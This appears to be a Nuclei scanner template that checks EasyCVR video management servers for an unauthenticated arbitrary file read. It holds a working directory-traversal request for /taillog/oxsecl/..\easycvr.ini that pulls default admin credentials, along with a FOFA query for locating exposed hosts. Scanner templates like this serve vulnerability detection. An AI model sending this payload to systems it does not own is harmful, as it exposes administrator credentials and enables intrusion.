flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "<title>EasyCVR")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "default_admin_user", "default_admin_password")
    - contains(content_type, "text/plain")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1

    Host: {{Hostname}}

    '
id: easycvr-arbitrary-file-read
info:
  author: s4e-io
  description: 'The EasyCVR-video management platform taillog interface has an arbitrary
    file read vulnerability. Unauthenticated attackers can use this vulnerability
    to read important system files (such as database configuration files, system configuration
    files), database configuration files, etc., which puts the website in an extremely
    insecure state.

    '
  metadata:
    fofa-query: icon_hash="458134656"
    max-request: 2
    verified: true
  name: EasyCVR Video Management - Arbitrary File Read
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkyNDY3MTY3MA==&mid=2247486259&idx=1&sn=dd51ca8df3aa1533144b975b9bec3086
  remediation: 'Ensure that the application does not allow directory traversal or
    access to sensitive files through web requests. Implement proper input validation
    and restrict access to critical files.

    '
  severity: high
  tags: easycvr,unauth,lfi,vuln
